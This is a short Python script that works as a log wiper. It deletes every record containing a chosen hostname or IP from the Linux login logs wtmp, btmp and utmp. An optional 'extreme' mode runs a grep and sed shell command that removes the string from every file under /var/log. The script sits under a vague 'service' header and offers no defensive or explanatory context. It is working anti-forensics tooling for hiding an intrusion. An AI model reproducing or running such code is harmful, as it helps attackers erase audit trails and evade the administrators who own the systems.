#// ... service ... //
import os

ufile = ["/var/log/wtmp", "/var/log/btmp/", "/var/run/utmp"];
hide = "Myh0sTnAmE-oR-iP"
CREWRITE = False # OVERWRITE UTMP.h FILES
EXTREME = False # DELETE IN A STUPID FUCKING WAY LOGS ABOUT THE <HIDE> STRING

def clear(utmpfile):
    utmpf = open(utmpfile, "rb");
    utmpb = utmpf.read();
    utmpf.close();

    NAME = utmpfile.split("/")[-1]
    L_SIZE = len(utmpb);
    I_SIZE = L_SIZE / 384;

    T_REG = []

    c = 0
    for i in range(0, I_SIZE):
        T_REG.append(utmpb[c:c+384]);
        c = c + 384

    # Rewrite in tmp file
    s = open("/tmp/"+NAME+".bak", "wb")
    for i in range(0, len(T_REG)):
        if hide not in T_REG[i]:
            s.write(T_REG[i]);

    s.close()

    if CREWRITE:
        os.rename("/tmp/"+NAME+".bak", utmpfile)
        
    if EXTREME:
        os.system("grep -rinl " + hide +" /var/log/ | xargs sed -i 's/"+hide+"//g'")

for tmp in ufile:
    if os.path.isfile(tmp):
        clear(tmp)
